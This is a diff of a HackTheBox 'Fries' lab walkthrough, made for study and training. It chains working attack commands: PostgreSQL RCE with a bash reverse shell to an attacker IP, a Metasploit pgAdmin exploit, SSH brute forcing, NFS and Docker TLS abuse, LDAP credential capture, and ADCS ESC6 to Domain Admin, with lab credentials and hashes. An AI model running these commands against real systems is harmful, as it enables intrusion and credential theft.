@@ -1,13 +1,34 @@
-# HackTheBox — Fries (Hard Windows) — Complete Detailed Walkthrough
+# 🍟 HackTheBox — Fries (Hard)
 
-**Difficulty:** Hard | **OS:** Windows Server 2019 DC + Linux Docker Host | **Domain:** fries.htb
+![Difficulty](https://img.shields.io/badge/Difficulty-Hard-red)
+![OS](https://img.shields.io/badge/OS-Windows%20%2B%20Linux-blue)
+![Status](https://img.shields.io/badge/Status-Rooted-brightgreen)
+![Platform](https://img.shields.io/badge/Platform-HackTheBox-green)
 
 ---
 
-## Attack Chain Overview
+## ⚠️ Disclaimer
+This writeup is for **educational purposes only** and was performed in an authorized HackTheBox environment.
+
+---
+
+## 🎯 Target Info
+
+| Field | Value |
+|-------|-------|
+| Machine | Fries |
+| Difficulty | Hard 🔴 |
+| OS | Hybrid — Linux + Windows AD |
+| Domain | fries.htb |
+| DC Hostname | dc01.fries.htb |
+| Status | ✅ Rooted |
+
+---
+
+## ⛓️ Attack Chain Overview
 
 ```
-Port Scan → Subdomain Discovery → Gitea Creds Leak → PgAdmin Login (d.cooper)
+Port Scan → Subdomain Discovery (FFUF) → Gitea Creds Leak → PgAdmin Login
 → PostgreSQL RCE → CVE-2025-2945 Meterpreter → Env Password Reuse
 → SSH as svc → NFS Weak Export → Docker TLS CA Abuse
 → LDAP Redirect (Responder) → svc_infra Cleartext Creds
@@ -17,34 +38,37 @@ Port Scan → Subdomain Discovery → Gitea Creds Leak → PgAdmin Login (d.coop
 
 ---
 
-## Initial Credentials (HTB Provided)
+## 📑 Table of Contents
 
-```
-User: d.cooper@fries.htb
-Pass: D4LE11maan!!
-```
-
-> These credentials fail for SMB, WinRM, and Kerberos — they are only valid for web applications.
-> 
+1. [Port Scanning](#1-port-scanning)
+2. [Host Mapping](#2-host-mapping)
+3. [Initial Credentials](#3-initial-credentials)
+4. [Subdomain Discovery](#4-subdomain-discovery-ffuf)
+5. [Gitea Recon → DB Creds](#5-gitea-recon--database-credentials)
+6. [PgAdmin Access → RCE](#6-pgadmin-access--postgresql-rce)
+7. [CVE-2025-2945 Meterpreter](#7-cve-2025-2945--pgadmin-authenticated-rce)
+8. [Password Reuse → SSH](#8-password-reuse--ssh-as-svc)
+9. [NFS Weak Export → Docker TLS](#9-nfs-weak-export--docker-tls-ca-abuse)
+10. [LDAP Credential Capture](#10-ldap-credential-capture--svc_infra)
+11. [BloodHound → gMSA](#11-bloodhound--readmsapassword--gmsa)
+12. [ADCS ESC6 → Domain Admin](#12-adcs-esc6--domain-admin)
+13. [Flags](#-flags)
 
 ---
 
-## 1. Reconnaissance
+## 1. Port Scanning
 
 ### Full Port Scan
-
 ```bash
 nmap -sS -p- --min-rate 10000 10.129.244.72 -oN nmap_initial.txt
 ```
 
 ### Service Version Scan
-
 ```bash
 nmap -sC -sV -p 22,53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985 10.129.244.72
 ```
 
 **Output:**
-
 ```
 PORT      STATE SERVICE       VERSION
 22/tcp    open  ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
@@ -65,18 +89,32 @@ PORT      STATE SERVICE       VERSION
 Service Info: Host: DC01; OSs: Linux, Windows; Domain: fries.htb
 ```
 
-> **Why:** We see port 22 (SSH on Linux host), standard AD ports (88, 389, 445, 5985), and web services on 80/443. This confirms a hybrid environment — Linux web host proxying to a Windows DC.
-> 
+> **Why:** Port 22 (SSH on Linux), standard AD ports (88, 389, 445, 5985), and web services on 80/443 confirm a **hybrid environment** — Linux web host proxying to a Windows DC.
 
-### Hosts File
+---
+
+## 2. Host Mapping
 
 ```bash
-echo "10.129.244.72 fries.htb dc01.fries.htb" | sudo tee -a /etc/hosts
+echo "10.129.244.72 fries.htb dc01.fries.htb code.fries.htb db-mgmt05.fries.htb" | sudo tee -a /etc/hosts
 ```
 
 ---
 
-## 2. Subdomain Discovery (FFUF)
+## 3. Initial Credentials
+
+HTB provided starting credentials:
+
+```
+User: d.cooper@fries.htb
+Pass: D4LE11maan!!
+```
+
+> ⚠️ These fail for SSH, SMB, WinRM — only valid for web applications.
+
+---
+
+## 4. Subdomain Discovery (FFUF)
 
 ```bash
 ffuf -c -u "http://fries.htb" -H "Host: FUZZ.fries.htb" \
@@ -85,28 +123,21 @@ ffuf -c -u "http://fries.htb" -H "Host: FUZZ.fries.htb" \
 
 **Output:**
 
+![FFUF Subdomain Discovery](images/01_ffuf_subdomain.png)
+
 ```
 code    [Status: 200, Size: 13591, Words: 1048, Lines: 272, Duration: 557ms]
 ```
 
-> **Why:** We filter by size 154 (default nginx response) to find real virtual hosts. Discovered `code.fries.htb` — a Gitea instance.
-> 
-
-```bash
-echo "10.129.244.72 code.fries.htb db-mgmt05.fries.htb pwm.fries.htb" | sudo tee -a /etc/hosts
-```
+> **Why:** `-fs 154` filters out default nginx responses (154 bytes). Discovered `code.fries.htb` — a **Gitea** instance.
 
 ---
 
-## 3. Gitea Recon → Database Credentials
+## 5. Gitea Recon → Database Credentials
 
-Browse to `http://code.fries.htb` — login with HTB provided creds:
+Browse to `http://code.fries.htb` → login with HTB creds:
 
-```
-d.cooper@fries.htb / D4LE11maan!!
-```
-
-Clone the repository and search git history for credentials:
+![Gitea Login](images/02_gitea_repo.png)
 
 ```bash
 git clone http://code.fries.htb/dale/fries.htb.git
@@ -114,37 +145,45 @@ cd fries.htb
 git log -p --all | grep -i "password\|secret\|DATABASE\|KEY\|token\|passwd" | head -50
 ```
 
-**Output (from git history):**
+**Output:**
+
+![Git History Creds](images/03_git_log_creds.png)
 
 ```
 DATABASE_URL=postgresql://root:PsqLR00tpaSS11@172.18.0.3:5432/ps_db
 SECRET_KEY=y0st528wn1idjk3b9a
 ```
 
-> **Why:** Developers often commit credentials accidentally. `git log -p --all` shows ALL changes including deleted lines, revealing passwords that were removed from current code.
-> 
+> **Why:** `git log -p --all` shows ALL changes including deleted lines — developers often commit credentials then try to delete them, but git history keeps everything.
 
-The README also references: `http://db-mgmt05.fries.htb` — a pgAdmin interface.
+The README also mentions: `http://db-mgmt05.fries.htb` — a pgAdmin interface.
 
 ---
 
-## 4. PgAdmin Access → PostgreSQL RCE
+## 6. PgAdmin Access → PostgreSQL RCE
 
 ### Login to pgAdmin
 
 Browse to `http://db-mgmt05.fries.htb`
+
+![PgAdmin Login](images/04_pgadmin_login.png)
 
 ```
 Username: d.cooper@fries.htb
 Password: D4LE11maan!!
 ```
 
-> **Why:** Password reuse — the HTB creds work here even though they failed on AD services.
-> 
+### pgAdmin Version
 
-### Connect to PostgreSQL
+![PgAdmin Version](images/05_pgadmin_version.png)
 
-In pgAdmin, add a new server:
+> pgAdmin version **9.1.0** — vulnerable to CVE-2025-2945.
+
+### Connect to PostgreSQL Server
+
+In pgAdmin → Object → Register → Server:
+
+![Register Server](images/06_pgadmin_register_server.png)
 
 ```
 Host: 172.18.0.3
@@ -154,41 +193,47 @@ Username: root
 Password: PsqLR00tpaSS11
 ```
 
-![Screenshot 2026-04-27 113302.png](attachment:71cf615c-4e94-4374-8f3a-e5ae7bc9bb0a:Screenshot_2026-04-27_113302.png)
+![Server Connection Details](images/07_pgadmin_connection.png)
 
-### Test Command Execution via SQL
-
-Open the Query Tool and run:
+### Test RCE — Directory Listing
 
 ```sql
--- Directory listing
 SELECT pg_ls_dir('/');
+```
 
--- File read
+![pg_ls_dir Output](images/08_pg_ls_dir.png)
+
+### Read /etc/passwd
+
+```sql
 SELECT pg_read_file('/etc/passwd');
 ```
 
-![Screenshot 2026-04-27 114618.png](attachment:84a28e6c-44fa-4868-99f0-27f0830f076e:Screenshot_2026-04-27_114618.png)
+![pg_read_file Output](images/09_pg_read_passwd.png)
+
+### Check Current User
+
+```sql
+CREATE TABLE IF NOT EXISTS cmd_test(result text);
+COPY cmd_test FROM PROGRAM 'id';
+SELECT * FROM cmd_test;
+```
 
 **Output:**
-
 ```
-root:x:0:0:root:/root:/bin/bash
-...
+uid=999(postgres) gid=999(postgres) groups=999(postgres),101(ssl-cert)
 ```
-
-> **Why:** The PostgreSQL `root` user has `pg_read_file` and `COPY FROM PROGRAM` privileges, allowing OS-level command execution.
-> 
 
 ### Reverse Shell
 
 Start listener on Kali:
-
 ```bash
 nc -lvnp 4444
 ```
 
 Execute in pgAdmin Query Tool:
+
+![Reverse Shell Query](images/10_reverse_shell_query.png)
 
 ```sql
 CREATE TABLE IF NOT EXISTS cmd_test(result text);
@@ -196,10 +241,7 @@ COPY cmd_test FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.14.66/4444 0>&1"'
 SELECT * FROM cmd_test;
 ```
 
-![Screenshot 2026-04-27 115053.png](attachment:5628f238-959a-479a-8c34-f56e136debad:Screenshot_2026-04-27_115053.png)
-
 **Shell received:**
-
 ```
 postgres@858fdf51af59:~/data$ whoami
 postgres
@@ -219,17 +261,22 @@ stty rows 40 columns 200
 
 ---
 
-## 5. CVE-2025-2945 — pgAdmin Authenticated RCE (Meterpreter)
+## 7. CVE-2025-2945 — pgAdmin Authenticated RCE
 
-![Screenshot 2026-04-27 103002.png](attachment:9e79b3e9-8227-4dc9-a1b0-a02e5727c025:Screenshot_2026-04-27_103002.png)
+pgAdmin 9.1.0 is vulnerable to **CVE-2025-2945** — authenticated RCE via Python `eval()` in the query tool.
 
-pgAdmin version 9.1.0 is vulnerable to CVE-2025-2945 — an authenticated RCE via Python `eval()` in the query tool download endpoint.
+### Metasploit Module
 
-![Screenshot 2026-04-27 103314.png](attachment:ec55c7dc-acd5-4dc1-b221-d2fcc6b1ea41:Screenshot_2026-04-27_103314.png)
+![MSF Search pgAdmin](images/11_msf_search_pgadmin.png)
 
 ```bash
 msfconsole -q
 msf > use exploit/multi/http/pgadmin_query_tool_authenticated
+```
+
+![MSF Options Set](images/12_msf_options.png)
+
+```
 msf > set USERNAME d.cooper@fries.htb
 msf > set PASSWORD D4LE11maan!!
 msf > set DB_USER root
@@ -243,13 +290,13 @@ msf > run
 
 **Output:**
 
+![Meterpreter Session](images/13_meterpreter_session.png)
+
 ```
 [*] Started reverse TCP handler on 10.10.14.66:4444
 [+] The target appears to be vulnerable. pgAdmin version 9.1.0 is affected
 [+] Successfully authenticated to pgAdmin
-[+] Successfully initialized sqleditor
-[*] Sending stage (23404 bytes) to 10.129.244.72
-[*] Meterpreter session 1 opened (10.10.14.66:4444 → 10.129.244.72:49816)
+[*] Meterpreter session 1 opened
 
 meterpreter > getuid
 Server username: pgadmin
@@ -257,7 +304,7 @@ Server username: pgadmin
 
 ---
 
-## 6. Password Reuse → SSH as svc
+## 8. Password Reuse → SSH as svc
 
 Inside the pgAdmin container, dump environment variables:
 
@@ -265,7 +312,7 @@ Inside the pgAdmin container, dump environment variables:
 cat /proc/self/environ | tr '\0' '\n'
 ```
 
-**Output:**
+![Environment Variables](images/14_env_vars.png)
 
 ```
 PGADMIN_DEFAULT_EMAIL=admin@fries.htb
@@ -273,48 +320,32 @@ PGADMIN_DEFAULT_PASSWORD=Friesf00Ds2025!!
 SECRET_KEY=1Mmv-sf5sOkJWFFATAIjb4zix4-_WI6Y9r_rA3cfZf0=
 ```
 
-> **Why:** Container environment variables frequently store application secrets. This password may be reused on other services.
-> 
+> **Why:** Container environment variables store application secrets. This password may be reused on SSH.
 
-Create a user wordlist and brute-force SSH:
+### Hydra SSH Brute Force
 
 ```bash
-cat > users.txt << EOF
-admin
-svc
-svc_infra
-infra
-root
-fries
-dale
-cooper
-d.cooper
-EOF
-
 hydra -L users.txt -p 'Friesf00Ds2025!!' ssh://10.129.244.72 -t 64 -I
 ```
 
 **Output:**
 
+![Hydra SSH](images/15_hydra_ssh.png)
+
 ```
 [22][ssh] host: 10.129.244.72   login: svc   password: Friesf00Ds2025!!
-1 of 1 target successfully completed, 1 valid password found
+1 of 1 target successfully completed
 ```
-
-SSH in:
 
 ```bash
 ssh svc@10.129.244.72
-```
-
-```
 svc@web:~$ whoami
 svc
 ```
 
 ---
 
-## 7. NFS Weak Export → Docker TLS CA Abuse
+## 9. NFS Weak Export → Docker TLS CA Abuse
 
 ### Check NFS Exports
 
@@ -322,29 +353,24 @@ svc
 svc@web:~$ showmount -e
 ```
 
-**Output:**
-
 ```
 Export list for web:
 /srv/web.fries.htb *
 ```
 
 ```bash
-svc@web:~$ ls -la /srv/web.fries.htb
+ls -la /srv/web.fries.htb
 ```
 
-**Output:**
-
 ```
-drwxrwx--- 2 root infra managers 4096 May 26  2025 certs
-drwxrwxrwx 2 root root           4096 May 31  2025 shared
-drwxr----- 5 svc  svc            4096 Jun  7  2025 webroot
+drwxrwx--- 2 root infra managers 4096 May 26 2025 certs
+drwxrwxrwx 2 root root           4096 May 31 2025 shared
+drwxr----- 5 svc  svc            4096 Jun  7 2025 webroot
 ```
 
-> **Why:** The NFS export is wildcard (*) with no `root_squash`, meaning we can connect as any UID. The `certs` folder contains Docker TLS certificates.
-> 
+> **Why:** NFS export is wildcard `*` with **no_root_squash** disabled — we can mount as any UID including root.
 
-### Setup Tunnel and NFS Tools (Kali)
+### Setup Tunnel + NFS Tools
 
 ```bash
 # Pivot into internal network
@@ -357,13 +383,9 @@ pipx install git+https://github.com/hvs-consulting/nfs-security-tooling.git
 nfs_analyze 192.168.100.2 --check-no-root-squash
 ```
 
-**Output (key parts):**
-
+**Key output:**
 ```
-Available Exports:
-/srv/web.fries.htb  *(wildcard)  sys
-
-no_root_squash: DISABLED   ← vulnerable!
+no_root_squash: DISABLED  ← VULNERABLE!
 
 Escape successful, root directory listing:
 lib64 mnt sys etc proc lib snap lost+found...
@@ -373,10 +395,7 @@ root:$y$j9T$yqbmFwMbHh7qoaRaY3jx..$FMFv9upB...
 svc:$y$j9T$Y7j3MSqEJTcNTqSSVJRS2.$h0AFlCXKB9...
 ```
 
-> **Why:** NFS trusts client-reported UIDs. With `--fake-uid` we can mount as any user including root, bypassing permission checks.
-> 
-
-### Mount NFS and Steal Certs
+### Mount NFS and Steal Docker TLS Certs
 
 ```bash
 mkdir /tmp/nfs_mount
@@ -385,13 +404,10 @@ fuse_nfs --export /srv/web.fries.htb --fake-uid --allow-write /tmp/nfs_mount 192
 ls -la /tmp/nfs_mount/certs
 ```
 
-**Output:**
-
 ```
--rw-r--r-- 1 root 59605603 1708 Apr 27 2026 ca-key.pem
+-rw-r--r-- 1 root 59605603 1708 Apr 27 2026 ca-key.pem   ← CA private key!
 -rw-r--r-- 1 root 59605603 1111 Apr 27 2026 ca.pem
 -rw-r--r-- 1 root 59605603 1115 Apr 27 2026 server-cert.pem
--rw-r--r-- 1 root 59605603  940 Apr 27 2026 server.csr
 -rw-r--r-- 1 root 59605603 1704 Apr 27 2026 server-key.pem
 ```
 
@@ -399,15 +415,13 @@ ls -la /tmp/nfs_mount/certs
 cp /tmp/nfs_mount/certs/* ~/AD-PROJECT/fries/
 ```
 
-### Abuse Docker TLS with Forged Root Certificate
-
-The Docker daemon is listening on TCP with TLS. We have the CA key, so we can sign our own certificate as `CN=root`:
+### Forge Root Certificate & Access Docker
 
 ```bash
 # Tunnel Docker port
 ssh svc@10.129.244.72 -L 2376:127.0.0.1:2376 -N &
 
-# Generate root certificate signed by the CA
+# Generate root cert signed by stolen CA
 openssl genrsa -out root-key.pem 4096
 openssl req -new -key root-key.pem -out root.csr -subj "/CN=root"
 openssl x509 -req -in root.csr \
@@ -416,15 +430,13 @@ openssl x509 -req -in root.csr \
   -out root-cert.pem -days 365
 ```
 
-**Output:**
-
 ```
 Certificate request self-signature ok
 subject=CN=root
 ```
 
 ```bash
-# List Docker containers
+# List all containers
 docker --tlsverify \
   --tlscacert=ca.pem \
   --tlscert=root-cert.pem \
@@ -433,7 +445,6 @@ docker --tlsverify \
 ```
 
 **Output:**
-
 ```
 CONTAINER ID   IMAGE                   NAMES
 f427ecaa3bdd   pwm/pwm-webapp:latest   pwm
@@ -443,8 +454,7 @@ bfe752a26695   fries-web               web
 b916aad508e2   gitea/gitea:1.22.6      gitea
 ```
 
-> **Why:** Docker TLS authenticates by certificate CN. By forging a cert with `CN=root` signed by the CA we stole, we get full Docker API access.
-> 
+> **Why:** Docker TLS authenticates by certificate CN. Forging a cert with `CN=root` signed by the stolen CA gives full Docker API access.
 
 ### Enter PWM Container
 
@@ -461,55 +471,55 @@ root
 
 ---
 
-## 8. LDAP Credential Capture via Responder
+## 10. LDAP Credential Capture → svc_infra
 
 ### Inspect PWM Configuration
 
 ```bash
-root@f427ecaa3bdd:/# cat /config/PwmConfiguration.xml | grep "ldap"
+cat /config/PwmConfiguration.xml | grep "ldap"
 ```
 
-**Key output:**
-
+**Key finding:**
 ```xml
-<setting key="ldap.serverUrls" profile="default">
-    <value>ldaps://dc01.fries.htb:636</value>
-...
+<value>ldaps://dc01.fries.htb:636</value>
 <value>{"type":"ldapUser","ldapBase":"CN=svc_infra,CN=Users,DC=fries,DC=htb"}</value>
 ```
 
-> **Why:** PWM (Password Manager) uses `svc_infra` as its LDAP bind account. If we redirect its LDAP connection to our machine, it will send us the credentials in cleartext.
-> 
+> **Why:** PWM uses `svc_infra` to bind to LDAP. Redirecting to our Responder will capture plaintext creds.
 
-### Redirect LDAP to Attacker(Go to the pwm web and login with creds of svc)
+### Redirect LDAP to Attacker
 
-![Screenshot 2026-04-27 133716.png](attachment:824538c9-29b4-4a06-9992-f03f322273f6:Screenshot_2026-04-27_133716.png)
+Inside the PWM container:
+```bash
+sed -i 's|ldaps://dc01.fries.htb:636|ldap://10.10.14.66:389|' /config/PwmConfiguration.xml
+```
 
-### Start Responder on Kali
+### Start Responder
 
 ```bash
 sudo responder -I tun0 -wdv
 ```
 
-**Output (captured credentials):**
+**Captured credentials:**
+
+![Responder LDAP Capture](images/16_responder_ldap.png)
 
 ```
-[LDAP] Attempting to parse an old simple Bind request.
 [LDAP] Cleartext Client   : 10.129.244.72
 [LDAP] Cleartext Username : CN=svc_infra,CN=Users,DC=fries,DC=htb
 [LDAP] Cleartext Password : m6tneOMAh5p0wQ0d
 ```
 
-Validate credentials:
+### Validate
 
 ```bash
 netexec ldap 10.129.244.72 -u svc_infra -p 'm6tneOMAh5p0wQ0d'
-# OUTPUT: [+] fries.htb\svc_infra:m6tneOMAh5p0wQ0d (Pwn3d!)
+# [+] fries.htb\svc_infra:m6tneOMAh5p0wQ0d ✅
 ```
 
 ---
 
-## 9. BloodHound → ReadMSAPassword → gMSA Hash
+## 11. BloodHound → ReadMSAPassword → gMSA
 
 ### Collect BloodHound Data
 
@@ -518,18 +528,17 @@ bloodhound-ce-python -d 'fries.htb' -u 'svc_infra' -p 'm6tneOMAh5p0wQ0d' \
   -ns 10.129.244.72 -c All --zip
 ```
 
-> **Why:** BloodHound maps AD relationships. It reveals `svc_infra` has `ReadMSAPassword` rights on the `gMSA_CA_prod$` Group Managed Service Account.
-> 
+> **BloodHound shows:** `svc_infra` → **ReadMSAPassword** → `gMSA_CA_prod$`
 
-![image.png](attachment:653e6e89-3289-4cd5-8b70-6fcd26ac41d2:image.png)
-
-### Dump gMSA Password
+### Dump gMSA Password Hash
 
 ```bash
 python gMSADumper.py -u 'svc_infra' -p 'm6tneOMAh5p0wQ0d' -d 'fries.htb'
 ```
 
 **Output:**
+
+![gMSADumper Output](images/17_gmsa_dumper.png)
 
 ```
 Users or groups who can read password for gMSA_CA_prod$:
@@ -538,8 +547,7 @@ gMSA_CA_prod$:::f6118585da63c6810f795676f8ddc87d
 gMSA_CA_prod$:aes256-cts-hmac-sha1-96:e88d13f5ef571d98587c27c52522f162239e9182...
 ```
 
-> **Why:** Group Managed Service Accounts have passwords automatically managed by AD. Principals with `ReadMSAPassword` can retrieve the current NT hash — no cracking needed.
-> 
+> **Why:** gMSA passwords are stored in AD and retrievable by authorized principals — no cracking needed, we get the NT hash directly.
 
 ### WinRM as gMSA
 
@@ -554,60 +562,38 @@ fries\gmsa_ca_prod$
 
 ---
 
-## 10. ADCS Enumeration
+## 12. ADCS ESC6 → Domain Admin
 
-```bash
-certipy-ad find -u 'gMSA_CA_prod$' -hashes 'f6118585da63c6810f795676f8ddc87d' \
-  -dc-ip 10.129.244.72 -vulnerable
-```
-
-Also enumerate from WinRM:
+### Enumerate CA Permissions
 
 ```powershell
 .\Certify.exe cas
 ```
 
 **Key findings:**
-
 ```
 Enterprise CA Name : fries-DC01-CA
-DNS Hostname       : DC01.fries.htb
-ManageCA rights    : FRIES\gMSA_CA_prod$  ← we have ManageCA!
-Enrollment Agent Restrictions : None
-Enabled Templates  : User, Machine, SubCA, Administrator...
+Allow  ManageCA, Enroll   FRIES\gMSA_CA_prod$  ← we have ManageCA!
 ```
 
-> **Why:** `gMSA_CA_prod$` has `ManageCA` rights, meaning it can modify CA configuration — enabling us to set dangerous flags.
-> 
-
----
-
-## 11. ADCS ESC6 — Enable EDITF_ATTRIBUTESUBJECTALTNAME2
-
-This flag allows any enrollee to specify an arbitrary Subject Alternative Name (SAN) in their certificate request, including UPNs of other users like Administrator.
-
-### Set the Flag via COM Object (WinRM)
+### Enable EDITF_ATTRIBUTESUBJECTALTNAME2 (ESC6)
 
 ```powershell
 $CA = New-Object -ComObject CertificateAuthority.Admin
 $Config = "DC01.fries.htb\fries-DC01-CA"
-
-# Current value: 1114446, add 262144 (EDITF_ATTRIBUTESUBJECTALTNAME2)
 $current = 1114446
-$new = $current -bor 262144  # = 1376590
+$new = $current -bor 262144   # Enable EDITF_ATTRIBUTESUBJECTALTNAME2
 
-# Split node path and entry name into separate arguments
 $CA.SetConfigEntry(
     $Config,
     "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy",
     "EditFlags",
     $new
 )
-
 Restart-Service certsvc -Force
 ```
 
-### Verify
+### Verify Flag is Set
 
 ```powershell
 certutil -config "DC01.fries.htb\fries-DC01-CA" -getreg policy\EditFlags
@@ -615,36 +601,19 @@ certutil -config "DC01.fries.htb\fries-DC01-CA" -getreg policy\EditFlags
 
 **Output:**
 
+![EditFlags Verified](images/18_editflags_verified.png)
+
 ```
 EditFlags REG_DWORD = 15014e (1376590)
-    EDITF_ATTRIBUTESUBJECTALTNAME2 -- 40000 (262144)  ← SET!
+    EDITF_ATTRIBUTESUBJECTALTNAME2 -- 40000 (262144)  ← SET! ✅
 ```
-
-Certify also confirms:
-
-```
-[!] UserSpecifiedSAN : EDITF_ATTRIBUTESUBJECTALTNAME2 set, enrollees can specify SANs!
-```
-
----
-
-## 12. Request Administrator Certificate (ESC6 Exploitation)
-
-### Sync Time First
-
-```bash
-sudo ntpdate fries.htb
-# OUTPUT: time stepped by 25207.428245
-```
-
-> **Why:** Kerberos authentication requires clock skew < 5 minutes. Without time sync, cert auth will fail with KRB_AP_ERR_SKEW.
-> 
 
 ### Request Certificate as Administrator
 
-Using `svc_infra` (Domain User with Enroll rights on User template):
-
 ```bash
+# Sync time first (required for Kerberos)
+sudo ntpdate fries.htb
+
 certipy-ad req -u 'svc_infra@fries.htb' -p 'm6tneOMAh5p0wQ0d' \
   -dc-ip 10.129.244.72 \
   -ca 'fries-DC01-CA' \
@@ -653,23 +622,13 @@ certipy-ad req -u 'svc_infra@fries.htb' -p 'm6tneOMAh5p0wQ0d' \
 ```
 
 **Output:**
-
 ```
-[*] Requesting certificate via RPC
-[*] Request ID is 42
 [*] Successfully requested certificate
 [*] Got certificate with UPN 'administrator@fries.htb'
-[*] Certificate object SID is 'S-1-5-21-858338346-3861030516-3975240472-3601'
-[*] Saving certificate and private key to 'administrator.pfx'
-[*] Wrote certificate and private key to 'administrator.pfx'
+[*] Saved to 'administrator.pfx'
 ```
 
-> **Why:** ESC6 is active — the CA now accepts our requested UPN (`administrator@fries.htb`) and embeds it in the certificate. The certificate object SID (3601) is `svc_infra`'s SID, which causes a mismatch issue on patched DCs (ESC16 is needed to bypass this, but the machine accepts it directly).
-> 
-
----
-
-## 13. Authenticate with Certificate → Get Administrator Hash
+### Authenticate → Get Administrator Hash
 
 ```bash
 certipy-ad auth -pfx administrator.pfx \
@@ -679,94 +638,83 @@ certipy-ad auth -pfx administrator.pfx \
 ```
 
 **Output:**
-
 ```
-[*] Certificate identities:
-[*]     SAN UPN: 'administrator@fries.htb'
-[*] Using principal: 'administrator@fries.htb'
-[*] Trying to get TGT...
 [*] Got TGT
-[*] Saved credential cache to 'administrator.ccache'
 [*] Got hash for 'administrator@fries.htb':
     aad3b435b51404eeaad3b435b51404ee:a773cb05d79273299a684a23ede56748
 ```
 
-> **Why:** PKINIT (Public Key Cryptography for Initial Authentication) allows us to use the certificate to get a Kerberos TGT as Administrator. Certipy extracts the NT hash from the PAC in the TGT.
-> 
+> **Why:** PKINIT allows certificate-based Kerberos auth. Certipy extracts the NT hash from the TGT PAC.
 
----
-
-## 14. Domain Admin — Pass the Hash
+### Pass the Hash → Domain Admin
 
 ```bash
 evil-winrm -i 10.129.244.72 -u 'Administrator' -H 'a773cb05d79273299a684a23ede56748'
 ```
 
-**Output:**
-
 ```
-Evil-WinRM shell v3.7
-Info: Establishing connection to remote endpoint
-
 *Evil-WinRM* PS C:\Users\Administrator\Documents>
 ```
 
-### Get the Flags
+---
+
+## 🏁 Flags
 
 ```powershell
 cd C:\Users\Administrator\Desktop
-dir
 type user.txt
 type root.txt
 ```
 
 **Output:**
 
-```
-Mode                LastWriteTime         Length Name
--ar---        4/27/2026   1:56 PM             34 root.txt
--ar---        4/27/2026   1:56 PM             34 user.txt
+![Flags](images/19_flags.png)
 
+```
 user.txt: 20040e0a3b5b9e663a33580d791615a1
 root.txt: 1b7444a4d4e9cfc99ce22ef1e1e4b7e5
 ```
 
-**Domain Admin achieved!**
-
 ---
 
-## Summary of Vulnerabilities Exploited
+## 📊 Vulnerability Summary
 
 | # | Vulnerability | Impact |
-| --- | --- | --- |
-| 1 | Gitea commit history exposes DB credentials | PostgreSQL access |
-| 2 | PostgreSQL COPY FROM PROGRAM (RCE) | Container shell as postgres |
-| 3 | CVE-2025-2945 pgAdmin authenticated RCE | Shell as pgadmin |
-| 4 | Password reuse (env var) | SSH as svc |
+|---|---------------|--------|
+| 1 | Gitea commit history — DB creds exposed | PostgreSQL access |
+| 2 | PostgreSQL COPY FROM PROGRAM (RCE) | Shell as postgres |
+| 3 | CVE-2025-2945 — pgAdmin authenticated RCE | Shell as pgadmin |
+| 4 | Container env var password reuse | SSH as svc |
 | 5 | NFS no_root_squash + wildcard export | Docker TLS cert theft |
-| 6 | Docker TLS CA key exposure | Full Docker API access |
-| 7 | PWM LDAP redirect + Responder | Cleartext svc_infra creds |
-| 8 | ReadMSAPassword on gMSA | gMSA NT hash |
+| 6 | Docker TLS CA key exposed via NFS | Full Docker API access |
+| 7 | PWM LDAP redirect → Responder capture | Cleartext svc_infra creds |
+| 8 | ReadMSAPassword on gMSA_CA_prod$ | gMSA NT hash |
 | 9 | ADCS ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2) | Certificate as Administrator |
-| 10 | PKINIT certificate authentication | Administrator NT hash |
+| 10 | PKINIT certificate authentication | Administrator NT hash → DA |
 
 ---
 
-## Tools Used
+## 🛠️ Tools Used
 
-- `nmap` — Port scanning
-- `ffuf` — Subdomain enumeration
-- `git` — Repository credential extraction
-- `msfconsole` — CVE-2025-2945 exploitation
-- `hydra` — SSH brute force
-- `sshuttle` — Network pivoting
-- `nfs_analyze` / `fuse_nfs` — NFS UID spoofing
-- `openssl` — Docker TLS cert forgery
-- `docker` — Container access
-- `responder` — LDAP cleartext capture
-- `bloodhound-ce-python` — AD enumeration
-- `gMSADumper` — gMSA password extraction
-- `evil-winrm` — WinRM shell
-- `Certify.exe` — ADCS enumeration
-- `certipy-ad` — Certificate request and authentication
-- `ntpdate` — Kerberos time sync
+| Tool | Purpose |
+|------|---------|
+| `nmap` | Port scanning |
+| `ffuf` | Subdomain enumeration |
+| `git` | Repository credential extraction |
+| `msfconsole` | CVE-2025-2945 exploitation |
+| `hydra` | SSH password spray |
+| `sshuttle` | Network pivoting |
+| `nfs_analyze` / `fuse_nfs` | NFS UID spoofing |
+| `openssl` | Docker TLS cert forgery |
+| `docker` | Container access |
+| `responder` | LDAP cleartext capture |
+| `bloodhound-ce-python` | AD enumeration |
+| `gMSADumper` | gMSA password extraction |
+| `evil-winrm` | WinRM shell |
+| `Certify.exe` | ADCS enumeration |
+| `certipy-ad` | Certificate request & auth |
+| `ntpdate` | Kerberos time sync |
+
+---
+
+*Writeup by shubham | HTB Fries — Hard | Rooted ✅*
